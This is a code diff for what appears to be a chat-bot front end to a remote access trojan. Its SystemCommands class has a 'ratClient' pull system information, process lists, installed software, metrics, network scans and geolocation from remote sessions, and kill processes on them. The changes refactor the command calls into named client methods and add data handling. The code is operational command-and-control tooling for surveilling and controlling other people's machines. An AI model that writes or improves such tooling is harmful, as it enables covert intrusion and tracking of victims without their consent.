@@ -21,7 +21,7 @@ export class SystemCommands {
       return;
     }
 
-    const result = await this.ratClient.sendCommand(sessionId, 'sysinfo');
+    const result = await this.ratClient.getSystemInfo(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -49,7 +49,7 @@ export class SystemCommands {
       text: ResponseFormatter.info('⚙️ Enumerating processes...\n\n_Please wait..._') 
     });
 
-    const result = await this.ratClient.sendCommand(sessionId, 'processes');
+    const result = await this.ratClient.getProcesses(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -73,7 +73,7 @@ export class SystemCommands {
       return;
     }
 
-    const result = await this.ratClient.sendCommand(sessionId, 'metrics');
+    const result = await this.ratClient.getMetrics(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -101,15 +101,17 @@ export class SystemCommands {
       text: ResponseFormatter.info('📦 Enumerating installed software...\n\n_This may take 30 seconds..._') 
     });
 
-    const result = await this.ratClient.sendCommand(sessionId, 'software', 120000);
+    const result = await this.ratClient.getSoftware(sessionId);
     
     if (result.success) {
-      const softwareList = result.data.split('\n').slice(0, 20);
+      const softwareData = typeof result.data === 'string' ? result.data.split('\n') : result.data;
+      const softwareList = Array.isArray(softwareData) ? softwareData.slice(0, 20) : Object.values(softwareData).slice(0, 20);
       let response = ResponseFormatter.header('📦', 'INSTALLED SOFTWARE') + '\n\n';
       
       softwareList.forEach((sw, idx) => {
-        if (sw.trim()) {
-          response += `${idx + 1}. ${sw.trim()}\n`;
+        const swStr = typeof sw === 'string' ? sw : JSON.stringify(sw);
+        if (swStr.trim()) {
+          response += `${idx + 1}. ${swStr.trim()}\n`;
         }
       });
       
@@ -140,7 +142,7 @@ export class SystemCommands {
       return;
     }
 
-    const result = await this.ratClient.sendCommand(sessionId, `kill ${pid}`);
+    const result = await this.ratClient.killProcess(sessionId, pid);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -168,7 +170,7 @@ export class SystemCommands {
       text: ResponseFormatter.info('🌐 Scanning network...\n\n_This may take 1-2 minutes..._') 
     });
 
-    const result = await this.ratClient.sendCommand(sessionId, 'netscan', 120000);
+    const result = await this.ratClient.networkScan(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -196,11 +198,11 @@ export class SystemCommands {
       text: ResponseFormatter.info('🌍 Getting geolocation...\n\n_Please wait..._') 
     });
 
-    const result = await this.ratClient.sendCommand(sessionId, 'locate');
+    const result = await this.ratClient.getGeolocation(sessionId);
     
     if (result.success) {
       try {
-        const location = JSON.parse(result.data);
+        const location = typeof result.data === 'string' ? JSON.parse(result.data) : result.data;
         let response = ResponseFormatter.header('🌍', 'GEOLOCATION') + '\n\n';
         
         Object.keys(location).forEach(key => {
@@ -209,8 +211,9 @@ export class SystemCommands {
         
         await this.sock.sendMessage(chatId, { text: response });
       } catch {
+        const dataStr = typeof result.data === 'string' ? result.data : JSON.stringify(result.data);
         await this.sock.sendMessage(chatId, { 
-          text: ResponseFormatter.info(result.data) 
+          text: ResponseFormatter.info(dataStr) 
         });
       }
     } else {
